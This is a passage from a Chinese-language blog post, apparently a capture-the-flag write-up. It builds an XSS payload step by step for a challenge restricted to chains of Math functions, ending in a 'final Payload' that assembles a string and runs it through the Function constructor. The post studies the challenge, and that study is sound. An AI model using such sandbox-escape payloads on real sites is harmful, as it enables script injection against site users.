+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.seeds.pop,Math.abs.name.charAt,Math.seeds.push,Math.cos,Math.log.name.charAt,Math.seeds.push,Math.cos,Math.exp.name.charAt,Math.seeds.push,Math.cos,Math.round.name.charAt,Math.seeds.push,Math.sin,Math.tan.name.charAt,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.tan,Math.constructor.defineProperties.name.charAt,Math.seeds.push,Math.log10,Math.round.name.charAt,Math.seeds.push,Math.cos,Math.ceil.name.charAt,Math.seeds.push,Math.cos,Math.seeds.unshift.name.charAt,Math.seeds.push,Math.cos,Math.max.name.charAt,Math.seeds.push,Math.sin,Math.exp.name.charAt,Math.seeds.push,Math.log,Math.sin.name.charAt,Math.seeds.push,Math.tan,Math.sqrt.name.charAt,Math.seeds.push,Math.sqrt,Math.atan,Math.exp,Math.exp,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.sqrt,Math.round.name.charAt,Math.seeds.push,Math.log10,Math.round.name.charAt,Math.seeds.push,Math.sin,Math.max.name.charAt,Math.seeds.push,Math.tan,Math.abs.name.charAt,Math.seeds.push,Math.tanh,Math.sin.name.charAt,Math.seeds.push,Math.acosh,Math.round.name.charAt,Math.seeds.push,Math.sqrt,Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push</span><br></pre></td></tr></table></figure>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/rka0lzcW0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rka0lzcW0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>接下來要把陣列裡面的字元串在一起變成字串，不過首先要先刪掉該陣列的前4項數字，方便操作，這邊可以用<code>shift()</code><br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/shift">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/shift</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.seeds.shift</span><br></pre></td></tr></table></figure>
+<p>做四次</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.seeds.pop,Math.abs.name.charAt,Math.seeds.push,Math.cos,Math.log.name.charAt,Math.seeds.push,Math.cos,Math.exp.name.charAt,Math.seeds.push,Math.cos,Math.round.name.charAt,Math.seeds.push,Math.sin,Math.tan.name.charAt,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.tan,Math.constructor.defineProperties.name.charAt,Math.seeds.push,Math.log10,Math.round.name.charAt,Math.seeds.push,Math.cos,Math.ceil.name.charAt,Math.seeds.push,Math.cos,Math.seeds.unshift.name.charAt,Math.seeds.push,Math.cos,Math.max.name.charAt,Math.seeds.push,Math.sin,Math.exp.name.charAt,Math.seeds.push,Math.log,Math.sin.name.charAt,Math.seeds.push,Math.tan,Math.sqrt.name.charAt,Math.seeds.push,Math.sqrt,Math.atan,Math.exp,Math.exp,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.sqrt,Math.round.name.charAt,Math.seeds.push,Math.log10,Math.round.name.charAt,Math.seeds.push,Math.sin,Math.max.name.charAt,Math.seeds.push,Math.tan,Math.abs.name.charAt,Math.seeds.push,Math.tanh,Math.sin.name.charAt,Math.seeds.push,Math.acosh,Math.round.name.charAt,Math.seeds.push,Math.sqrt,Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift</span><br></pre></td></tr></table></figure>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/B1xhWMqWC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B1xhWMqWC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>乾淨了，目前還有19個函式的空間<br>接下來讓他變string，可以用<code>join()</code>但是如果直接用會變成中間都有<code>,</code>，所以這裡可以加入一個空陣列參數<code>[]</code>讓他中間不會有逗號。<br>這是一個<code>[]</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.seeds.constructor</span><br></pre></td></tr></table></figure>
+
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/HJTdQM5WR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HJTdQM5WR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/Hy0rmz9-C.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Hy0rmz9-C.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>另外，執行上一個payload，最後一個返回的會是0.62536<br>你把一個float丟進<code>Math.seeds.constructor</code>會噴錯，但你丟入整數就會正常執行，所以要加個floor，強制把0.62536轉0</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/HyovFzc-A.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HyovFzc-A.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/Bywjtz9W0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Bywjtz9W0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>所以payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.floor,Math.seeds.constructor,Math.seeds.join</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/floor">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/floor</a><br>目前payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.seeds.pop,Math.abs.name.charAt,Math.seeds.push,Math.cos,Math.log.name.charAt,Math.seeds.push,Math.cos,Math.exp.name.charAt,Math.seeds.push,Math.cos,Math.round.name.charAt,Math.seeds.push,Math.sin,Math.tan.name.charAt,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.tan,Math.constructor.defineProperties.name.charAt,Math.seeds.push,Math.log10,Math.round.name.charAt,Math.seeds.push,Math.cos,Math.ceil.name.charAt,Math.seeds.push,Math.cos,Math.seeds.unshift.name.charAt,Math.seeds.push,Math.cos,Math.max.name.charAt,Math.seeds.push,Math.sin,Math.exp.name.charAt,Math.seeds.push,Math.log,Math.sin.name.charAt,Math.seeds.push,Math.tan,Math.sqrt.name.charAt,Math.seeds.push,Math.sqrt,Math.atan,Math.exp,Math.exp,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.sqrt,Math.round.name.charAt,Math.seeds.push,Math.log10,Math.round.name.charAt,Math.seeds.push,Math.sin,Math.max.name.charAt,Math.seeds.push,Math.tan,Math.abs.name.charAt,Math.seeds.push,Math.tanh,Math.sin.name.charAt,Math.seeds.push,Math.acosh,Math.round.name.charAt,Math.seeds.push,Math.sqrt,Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.floor, Math.seeds.constructor,Math.seeds.join</span><br></pre></td></tr></table></figure>
+
+<p>最後把最前面執行的串在一起，就可以成功XSS了</p>
+<h3 id="final-Payload"><a href="#final-Payload" class="headerlink" title="final Payload"></a>final Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.seeds.pop,Math.abs.name.charAt,Math.seeds.push,Math.cos,Math.log.name.charAt,Math.seeds.push,Math.cos,Math.exp.name.charAt,Math.seeds.push,Math.cos,Math.round.name.charAt,Math.seeds.push,Math.sin,Math.tan.name.charAt,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.tan,Math.constructor.defineProperties.name.charAt,Math.seeds.push,Math.log10,Math.round.name.charAt,Math.seeds.push,Math.cos,Math.ceil.name.charAt,Math.seeds.push,Math.cos,Math.seeds.unshift.name.charAt,Math.seeds.push,Math.cos,Math.max.name.charAt,Math.seeds.push,Math.sin,Math.exp.name.charAt,Math.seeds.push,Math.log,Math.sin.name.charAt,Math.seeds.push,Math.tan,Math.sqrt.name.charAt,Math.seeds.push,Math.sqrt,Math.atan,Math.exp,Math.exp,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.sqrt,Math.round.name.charAt,Math.seeds.push,Math.log10,Math.round.name.charAt,Math.seeds.push,Math.sin,Math.max.name.charAt,Math.seeds.push,Math.tan,Math.abs.name.charAt,Math.seeds.push,Math.tanh,Math.sin.name.charAt,Math.seeds.push,Math.acosh,Math.round.name.charAt,Math.seeds.push,Math.sqrt,Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.floor,Math.seeds.constructor,Math.seeds.join,Math.constructor.constructor,Math.seeds.sort</span><br></pre></td></tr></table></figure>
+
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/HJfEhM9-R.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HJfEhM9-R.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+
+            </div>
+
+            <!-- Post information -->
+            
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+        <ul class="pagination d-block text-center">
+            
+            
+                <li class="next page-item d-inline"><a href="/2024/04/25/Assembly-x86/" class="page-link float-right">Older  &rarr;</a></li>
+            
+        </ul>
+    </div>
+
+
+            
+                <!-- Comments -->
+                
+
+                
+
+            
+
+        </div>
+    </div>
+</article> 
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    <style>
+        #toc-content .toc-link::before {
+            background-color: transparent;
+            max-height: 25px;
+        }
+
+        #toc-content .toc-link.is-active-link::before {
+            background-color: #404040;
+        }
+    </style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
+        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
+            <i class="fas fa-list"></i>
+        </button>
+        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
+            <div class="toc-widget">
+                <div id="toc-content" class="text-truncate">
+                </div>
+            </div>
+            <div class="toc-menu pt-3 pl-4">
+                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
+                <a class="back-to-top d-block py-1" href="#">Back to top</a>
+                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '#toc-content',
+            // Where to grab the headings to build the table of contents.
+            contentSelector: 'article',
+            // Which headings to grab inside of the contentSelector element.
+            headingSelector: 'h1, h2, h3',
+            // For headings inside relative or absolute positioned containers within content.
+            hasInnerContainers: true,
+        });
+    </script>
+
+
+    
+
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
+                <ul class="list-inline">
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+                <ul class="copyright footer-menu list-inline">
+                    
+                    
+                        <li class="list-inline-item">
+                            
+                            
+                            <a href="/">
+                                
+                                    Home
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/archives">
+                                
+                                    Archives
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/tags">
+                                
+                                    Tags
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/categories">
+                                
+                                    Categories
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/about">
+                                
+                                    About
+                                
+                            </a>
+                        </li>
+                    
+                </ul>
+                <p class="copyright footer-author">
+                    &copy; -2024 
+                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
+                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
+                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
+                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
+                    
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    <!-- jQuery -->
+<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+
+<!-- For drop down -->
+<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
+<!-- Gallery -->
+<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
+<!-- Busuanzi -->
+
+
+<!-- Search script -->
+
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+    $(function () {
+        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
+    });
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Search Modal -->
+    <!-- Modal -->
+<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+        <div class="modal-content overflow-auto">
+            <div class="modal-header">
+                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <div id="searchResult">
+                    <div class="search-empty text-center text-muted p-5">
+                        <i class="far fa-meh"></i>
+                    </div>
+                </div>
+            </div> 
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
